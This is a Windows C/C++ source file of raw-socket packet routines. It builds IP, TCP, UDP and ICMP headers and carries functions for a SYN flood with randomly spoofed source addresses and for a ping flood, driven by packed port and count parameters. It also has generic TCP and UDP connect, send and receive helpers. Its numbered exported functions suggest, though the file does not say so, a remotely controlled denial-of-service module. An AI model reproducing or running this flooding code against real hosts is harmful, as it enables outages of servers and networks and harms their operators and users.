
#include <winsock2.h>

#include <ws2tcpip.h>
#include <stdlib.h>
#include <iprtrmib.h>

#pragma pack(1)
struct ip
{
	BYTE	ip_hl:4;
	BYTE	ip_v:4;
	BYTE	ip_tos;
	WORD	ip_len;
	WORD	ip_id;
	WORD	ip_off;
	#define	IP_RF 0x8000			/* reserved fragment flag */
	#define	IP_DF 0x4000			/* dont fragment flag */
	#define	IP_MF 0x2000			/* more fragments flag */
	#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
	BYTE	ip_ttl;
	BYTE	ip_p;
	WORD	ip_sum;
	struct	in_addr ip_src, ip_dst;
};

struct tcphdr
{
	WORD	source;
	WORD	dest;
	DWORD	seq;
	DWORD	ack_seq;
	WORD	res1:4;
	WORD	doff:4;
	WORD	fin:1;
	WORD	syn:1;
	WORD	rst:1;
	WORD	psh:1;
	WORD	ack:1;
	WORD	urg:1;
	WORD	res2:2;
	WORD	window;
	WORD	check;
	WORD	urg_ptr;
};

struct udphdr
{
	WORD	source;
	WORD	dest;
	WORD	len;
	WORD	check;
};

struct icmphdr
{
	BYTE	i_type;
	BYTE	i_code;
	WORD	i_cksum;
	WORD	i_id;
	WORD	i_seq;
	DWORD	timestamp;
};

union SyncFloodParam
{
	DWORD	param;
	struct
	{
		DWORD	port:16;
		DWORD	count:16;
	};
	SyncFloodParam( DWORD p ) : param(p) { }
	SyncFloodParam( DWORD _port, DWORD _count) : port(_port), count(_count) { }
	operator DWORD () const { return param; }
};

union PingFloodParam
{
	DWORD	param;
	struct
	{
		DWORD	seq:16;
		DWORD	size:11;
		DWORD	count:5;
	};
	PingFloodParam( DWORD p ) : param(p) { }
	PingFloodParam( DWORD _seq, DWORD _size, DWORD _count ) : 
		seq(_seq), size(_size), count(_count) { }
	operator DWORD () const { return param; }
};

#pragma pack()

static WORD cksum(LPVOID data, size_t len)
{
	WORD *p = (WORD *)data;
	DWORD sum = 0;
	while ( len > 1 )
	{
		sum += *p++;
		len -= 2;
	}
	if ( len )
		sum += *(BYTE*)p;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (WORD)~sum;
}

static WORD ip_cksum(struct ip *pip)
{
	return cksum( pip, pip->ip_hl * 4 );
}

static WORD tcpudp_cksum(struct ip *pip, void *protocol_head)
{
	DWORD sum = 0;
	unsigned len = ntohs(pip->ip_len) - (4 * pip->ip_hl);
	WORD *p = (WORD *)(&pip->ip_src);
	sum += p[0];
	sum += p[1];
	sum += p[2];
	sum += p[3];
	sum += htons((WORD)pip->ip_p);
	sum += htons((WORD)len);
	p = (WORD *)protocol_head;
	while ( len > 1 )
	{
		sum += *p++;
		len -= 2;
	}
	if ( len )
		sum += *(BYTE *)p;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (WORD)~sum;
}

//1
DWORD WINAPI ip_socket()
{
	int s = socket( AF_INET, SOCK_RAW, IPPROTO_IP );
	int optval =1;
	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (const char *)&optval, sizeof(optval));
	return s;
}

//2
DWORD WINAPI send_ip( DWORD s, DWORD packet, DWORD size )
{
	struct ip *pip = (struct ip *) packet;
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr   = pip->ip_dst;
	pip->ip_sum = 0;
	pip->ip_sum = ip_cksum(pip);
	return sendto( s, (const char *)packet, size, 0, (struct sockaddr *)&addr, sizeof(addr));
}
//3
DWORD WINAPI send_tcp( DWORD s, DWORD packet, DWORD size )
{
	struct ip *pip = (struct ip *) packet;
	struct tcphdr *ptcp = (struct tcphdr *)( packet + pip->ip_hl * 4 );
	ptcp->check = 0;
	ptcp->check = tcpudp_cksum( pip, ptcp );
	return send_ip( s, packet, size );
}
//4
DWORD WINAPI send_udp( DWORD s, DWORD packet, DWORD size )
{
	struct ip *pip = (struct ip *) packet;
	struct udphdr *pudp = (struct udphdr *)( packet + pip->ip_hl * 4 );
	pudp->check = 0;
	pudp->check = tcpudp_cksum(pip, pudp);
	return send_ip( s, packet, size );
}

static void syn_send( int sock, DWORD ip, WORD port )
{
	static BYTE packet[] =
	{ 
		0x45,0x10,0x00,0x3c,0x23,0xb4,0x40,0x00,0x3f,0x06,0xbd,0xa3,0xac,0x10,0x00,0x32,
		0xac,0x10,0x02,0x02,0x92,0x5c,0x1f,0x40,0xb0,0x39,0xcb,0x13,0x00,0x00,0x00,0x00,
		0xa0,0x02,0x16,0xd0,0x9b,0x14,0x00,0x00,0x02,0x04,0x05,0xb4,0x04,0x02,0x08,0x0a,
		0x26,0x3a,0xe8,0xa7,0x00,0x00,0x00,0x00,0x01,0x03,0x03,0x02                  
	};
	struct ip *pip = (struct ip *)packet;
	struct tcphdr *ptcp = (struct tcphdr *)( packet + pip->ip_hl * 4 );
	pip->ip_src.s_addr = rand();
	pip->ip_dst.s_addr = ip;
	ptcp->source = rand();
	ptcp->dest = port;
	ptcp->seq = rand();
	*(((DWORD *)packet) + 12) = rand();
	*(((DWORD *)packet) + 13) = rand();
	send_tcp( sock, (DWORD)packet, sizeof(packet));
}
//5
DWORD WINAPI send_sync(DWORD ip, DWORD p)
{
	SyncFloodParam param(p);
	DWORD s = ip_socket();
	while ( param.count -- > 0 ) syn_send( s, ip, htons(param.port) );
	closesocket(s);
	return 0;
}
//6
DWORD WINAPI send_ping(DWORD ip, DWORD p)
{
	PingFloodParam param(p);
	struct sockaddr_in addr;
	memset( &addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = ip;
	char buffer[2048];
	icmphdr *hdr = (icmphdr*)buffer;
	hdr->i_code  = 0;
	hdr->i_id    = 0;
	hdr->i_type  = 8;
	int s = socket( AF_INET, SOCK_RAW, IPPROTO_ICMP );
	while ( param.count -- > 0 )
	{
		hdr->i_seq   = htons(param.seq);
		hdr->i_cksum = 0;
		hdr->i_cksum = cksum( buffer, param.size );
		int rv = sendto( s, (const char *)buffer, param.size, 0, (struct sockaddr *)&addr, sizeof(addr));
		param.seq ++;
	}
	closesocket(s);
	return 0;
}


typedef DWORD (WINAPI *GetBestInterface_t)(DWORD, PDWORD);
typedef DWORD (WINAPI *GetIpAddrTable_t)(PMIB_IPADDRTABLE, PULONG, BOOL);
//7
DWORD WINAPI GetBestSourceIP( DWORD dst_ip )
{
	DWORD src_ip = (DWORD)-1;
	HMODULE hMod = LoadLibrary( TEXT("iphlpapi.dll") );
	if ( hMod == NULL ) return src_ip;
	GetBestInterface_t GetBestInterface = (GetBestInterface_t)GetProcAddress( hMod, "GetBestInterface" );
	GetIpAddrTable_t GetIpAddrTable = (GetIpAddrTable_t)GetProcAddress(hMod, "GetIpAddrTable");
	if ( GetBestInterface == NULL || GetIpAddrTable == NULL ) return src_ip;
	DWORD iidx, size = 0;
	(*GetBestInterface)( dst_ip, &iidx );
	(*GetIpAddrTable)(NULL, &size, TRUE);
	PMIB_IPADDRTABLE table = (PMIB_IPADDRTABLE)malloc(size);
	(*GetIpAddrTable)(table, &size, TRUE);
	FreeLibrary(hMod);
	for ( DWORD i = 0; i < table->dwNumEntries; i++ )
		if ( table->table[i].dwIndex == iidx )
		{
			src_ip = table->table[i].dwAddr;
			break;
		}
	free(table);
	return src_ip;
}

DWORD WINAPI connect_tcpudp(DWORD ip, DWORD param1)
{
	bool tcp = (param1 &0xffff0000) == 0;
	DWORD sockfd = socket(AF_INET, tcp ? SOCK_STREAM : SOCK_DGRAM, 0);
	if( sockfd == INVALID_SOCKET ) return -1;				
	WORD port = (WORD)(param1 &0xffff);
	struct sockaddr_in servaddr;
	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(port);
	servaddr.sin_addr.s_addr = ip;
	if( 0 == connect(sockfd, (struct sockaddr*) &servaddr, sizeof(servaddr)))
		return sockfd;
	closesocket(sockfd);
	return -1;
}

DWORD WINAPI send_tcpudp(SOCKET s, const char* buff, int size)
{
	return send(s,buff,size,0);
}

DWORD WINAPI recv_tcpudp(SOCKET s, char* buff, int size)
{
	return recv(s,buff,size,0);
}

DWORD WINAPI close_tcpudp(SOCKET s)
{
	return closesocket(s);
}

DWORD WINAPI ioctl_tcpudp(SOCKET s, long p1, u_long* p2)
{
	return ioctlsocket(s,p1,p2);
}